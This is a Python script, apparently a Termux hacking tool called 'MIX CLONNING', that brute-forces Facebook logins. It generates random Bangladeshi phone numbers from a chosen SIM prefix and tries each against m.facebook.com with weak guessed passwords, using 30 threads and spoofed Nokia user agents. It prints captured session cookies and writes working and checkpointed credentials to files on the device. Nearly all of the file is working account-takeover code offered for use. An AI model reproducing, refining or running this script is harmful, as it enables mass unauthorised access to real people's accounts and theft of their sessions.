import os,time
os.system('clear')
print(' \033[1;32mServer Loading.....');time.sleep(2)
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
except:pass
user=[]
ok=[]
cp=[]
loop=0
ugen=[]
#------------------USER AGENT------------------#
for snigdho in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
#------------------LOGO--------------------#
logo=("""
\x1b[1;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;94m
\x1b[1;91m┃  \033[1;91m$$\      $$\  $$$$$$\  $$\      $$\ $$\   $$\ $$\   $$\ 
$$$\    $$$ |$$  __$$\ $$$\    $$$ |$$ |  $$ |$$$\  $$ |
$$$$\  $$$$ |$$ /  $$ |$$$$\  $$$$ |$$ |  $$ |$$$$\ $$ |
$$\$$\$$ $$ |$$$$$$$$ |$$\$$\$$ $$ |$$ |  $$ |$$ $$\$$ |
$$ \$$$  $$ |$$  __$$ |$$ \$$$  $$ |$$ |  $$ |$$ \$$$$ |
$$ |\$  /$$ |$$ |  $$ |$$ |\$  /$$ |$$ |  $$ |$$ |\$$$ |
$$ | \_/ $$ |$$ |  $$ |$$ | \_/ $$ |\$$$$$$  |$$ | \$$ |
\__|     \__|\__|  \__|\__|     \__| \______/ \__|  \__|
                                                        
\x1b[1;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;94m

\033[1;96m══════════════════════════════════════════════════════════════
 \x1b[1;36m[+] \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: MANIK HASAN MAMUN
 \x1b[1;36m[+] \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mHABIBA-404
 \x1b[1;36m[+] \x1b[1;91mTOOL NAME         \x1b[1;97m: \x1b[1;97mMIX \x1b[1;91mCLONNING
 \x1b[1;36m[+] \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mPID  \x1b[1;92mTOOL
 \x1b[1;36m[+] \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.3
\033[1;96m══════════════════════════════════════════════════════════════
""")
def clear():
    os.system('clear')
    print(logo)
def line():
    print(62*'━')
def SHAWON_main():
    clear()
    print(' [1] RANDOM CRACK BD')
    print(' [2] JOIN OUR FACEBOOK GROUP')
    print(' [3] EXIT')
    print(62*'━')
    SHAWON=input(' CHOSE MENU : ')
    if SHAWON in '1':
        SHAWON_rndm()
    if SHAWON in '2':
     os.system('xdg-open https://facebook.com/groups/termuxshawonahmed/')
    if SHAWON in '3':
       sys.exit("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def SHAWON_rndm():
     clear()
     print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
     code=input(' [+] ENTER SIM CODE : ')
     line()
     limit=int(input(' [+] CRACK LIMIT : 1000, 2000, 3000, 4000, 5000\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n CRACK ID : '))
     for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
     with tred(max_workers=30) as tanisha:
        clear()
        total=str(len(user))
        print(f' YOUR SIM CODE : {code}\n CRACK LIMIT  : {total}')
        print(' [+] PROCESS HAS BEEN STARTED ')
        print(' [!] WAIT FOR IDZ ')
        print(' [!] USE FLIGHT MODE IN EVERY 3 MINUTES ')
        line()
        for snigdho in user:
            uid=code+snigdho
            ak=uid[:7]
            st=uid[0:7]
            lm=uid[:6]
            hs=uid[0:6]
            pss=[uid,snigdho,ak,st,lm,hs,'bangladesh','i love you','jannat','alamin','freefire123','ayesha','mohammad']
            tanisha.submit(SHAWON_cracker,uid,pss)
     print(62*'━')
     print(f' TOTAL OK/CP : {str(len(ok))}/{str(len(cp))}')
     line()

def SHAWON_cracker(uid,pss):
    global ok
    global loop
    try:
        for ps in pss:
            session=requests.Session()
            sys.stdout.write(f'\r [FINDING] = {loop} [COUNTING]  OK-{len(ok)}\r')
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            pron_star={
    'authority': 'x.facebook.com',
	'method':'GET',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X6515"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f' [FIRE🔥] {idf} > {ps}\n [💙]=[COOKIE]= {coki}')
                open('/sdcard/HABIBA-OK.txt','a').write(idf+' : '+ps+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                print(f' [FUCK🖕] {idf} > {ps}')
                open('/sdcard/HABIBA-CP.txt','a').write(idf+' : '+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except:
        pass

SHAWON_main()